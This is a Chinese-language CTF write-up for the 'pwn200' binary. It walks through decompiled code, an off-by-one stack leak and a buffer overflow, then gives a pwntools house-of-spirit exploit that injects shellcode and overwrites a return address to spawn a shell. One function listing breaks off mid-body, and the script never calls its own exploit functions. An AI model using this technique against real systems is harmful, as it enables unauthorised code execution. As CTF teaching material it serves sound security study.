IDA静态分析

main 函数调用的是sub_400A8E()的主程序部分

__int64 sub_400A8E()
{
  __int64 i; // [rsp+10h] [rbp-40h]
  char v2[48]; // [rsp+20h] [rbp-30h] BYREF

  puts("who are u?");
  for ( i = 0LL; i <= 47; ++i )
  {
    read(0, &v2[i], 1uLL);
    if ( v2[i] == 10 )
    {
      v2[i] = 0;
      break;
    }
  }
  printf("%s, welcome to ISCC~ \n", v2);
  puts("give me your id ~~?");
  sub_4007DF();
  return sub_400A29();
}

可以看到for循环存在off-by-one漏洞，循环执行了48次，如果我们正好输入48个字节，则字符串末尾不会添加NULL，且printf遇到‘\x00’才会截断，则printf可能会泄露RBP。

接下来分析sub_4007DF()函数

int sub_4007DF()
{
  char nptr[8]; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  v2 = 0;
  for ( i = 0; i <= 3; ++i )
  {
    read(0, &nptr[i], 1uLL);
    if ( nptr[i] == 10 )
    {
      nptr[i] = 0;
      break;
    }
    if ( nptr[i] > 57 || nptr[i] <= 47 )
    {
      printf("0x%x ", (unsigned int)nptr[i]);
      return 0;
    }
  }
  v2 = atoi(nptr);
  if ( v2 >= 0 )
    return atoi(nptr);
  else
    return 0;
}

C 库函数 int atoi(const char *str) 把参数 str 所指向的字符串转换一个整数（类型为 int 型）。下面是 atoi() 函数的声明。

int atoi(const char *str) str — 要转换为整数的字符串。

该函数将输入的数字转化为int类型

由汇编代码可以看到，该函数的返回值被保存在rbp+0x38的地址，紧邻v2之前。

分析sub_400A29()函数

__int64 sub_400A29()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  char *dest; // [rsp+38h] [rbp-8h]

  dest = (char *)malloc(0x40uLL);
  puts("give me money~");
  read(0, buf, 0x40uLL);
  strcpy(dest, buf);
  ptr = dest;
  return sub_4009C4();
}

该函数调用read()读入0x40字节到0x38字节大小的buf上，存在缓冲区溢出漏洞，可导致指针dest被覆盖，即改变ptr。

ptr是个全局指针

.bss:0000000000602098 ; void *ptr
.bss:0000000000602098 ptr             dq ?                    ; DATA XREF: sub_4008B7+8↑r
.bss:0000000000602098                                         ; sub_4008B7+4B↑w ...
.bss:0000000000602098 _bss            ends

值得一提的是strcpy函数，这个函数将buf中的数值复制到chunk中，但是strcpy函数有个特点就是遇到\x00就会终止复制，所以这个步骤实际上是可以被绕过的。

继续来到sub_4009C4()函数

int sub_4009C4()
{
  int v0; // eax

  while ( 1 )
  {

sub_4009AF()函数为菜单函数，sub_4007DF()可读入数字字符的

int sub_4008B7()
{
  int nbytes; // [rsp+Ch] [rbp-4h]

  if ( ptr )
    return puts("already check in");
  puts("how long?");
  nbytes = sub_4007DF();
  if ( nbytes <= 0 || nbytes > 128 )
    return puts("invalid length");
  ptr = malloc(nbytes);
  printf("give me more money : ");
  printf("\n%d\n", (unsigned int)nbytes);
  read(0, ptr, (unsigned int)nbytes);
  return puts("in~");
}

check in首先对全局指针ptr进行判断，如果为空则由用户输入 需要分配的空间大小，也就是long，并调用malloc()函数分配空间， 返回值保存在ptr。接下来调用read()读入long字节的字符串到ptr指 向的内存区域。

void sub_40096D()
{
  if ( ptr )
  {
    puts("out~");
    free(ptr);
    ptr = 0LL;
  }
  else
  {
    puts("havn't check in");
  }
}

check out也是首先判断ptr，如果不为空，则将其作为参数传递 给free()函数，释放空间并设置ptr为0。

漏洞利用

我们知道栈是由高地址向低地址增长的，也就是说调用者的栈帧 比被调用者的栈帧地址更高。仔细梳理程序的函数调用链，为了构造 house-of-spirit ， 可 以 考 虑 在 栈 上 的 返 回 地 址 附 近 伪 造 fake chunk，在获得该区域的控制权后，修改返回地址为shellcode地 址。详细利用步骤如下。

  1. 利用sub_400A8E()函数的”who are u?”，将shellcode 布置到栈上并泄露RBP；
  2. 利用”give me your id ~~?”，布置next chunk的size 域；
  3. 利用sub_400A29()函数的”give me money~”，布置 fake chunk的size域，并修改指针ptr指向fake chunk的mem位 置；
  4. 释放fake chunk，再将其分配出来，获得该区域控制权；
  5. 修改sub_400A29()函数的返回地址为shellcode地址；
  6. 结束程序，获得shell。

from pwn import*
#p=remote("node4.buuoj.cn",28763)
p=process('./pwn200')
shellcode=asm(shellcraft.amd64.linux.sh(),arch='amd64')

def leak():
    global fake_addr,shellcode_addr
    payload=shellcode.rjust(48,'A')
    p.sendafter("who are u?\n",payload)
    p.recvuntil(payload)
    rbp_addr=u64(p.recv(6).ljust(8,'\x00'))
    shellcode_addr=rbp_addr-0x50  
    fake_addr=rbp_addr-0x50-0x40       #此处根据fake chunk的size可得知 
    print("rbp_addr=",hex(rbp_addr))
    print("shellcode_addr=",shellcode_addr)
    print("fake_addr=",fake_addr)

def house_of_spirit():
    p.sendlineafter("give me your id ~~?\n",'65')          #next.size
    #32bytes padding + prev_size + size + padding + fake_addr
    fake_chunk=p64(0)*5+p64(0x41)                          #fake.size
    fake_chunk=fake_chunk.ljust(56,'\x00')                 
    fake_chunk+=p64(fake_addr)                             #ptr   
    print(hex(fake_addr))         
    p.sendafter("give me money~\n",fake_chunk)

    #gdb.attach(p)
    #pause()
    p.sendlineafter("your choice : ",'2')                #free(fake_addr)
    #p.recvuntil('choice : ')
    #p.sendline('2')
    p.sendlineafter("your choice : ",'1')                #malloc(fake_addr)
    p.sendlineafter("long?",'48')

    payload='A'*0x18
    payload+=p64(shellcode_addr)                        #overwrite return address
    payload=payload.ljust(48,'\x00')                    #填充0x30=0x40-0x10
    p.sendlineafter("48",payload)

def pwn():
    p.sendlineafter("choice",'3')
    p.interactive()

print(p64(0)*5)
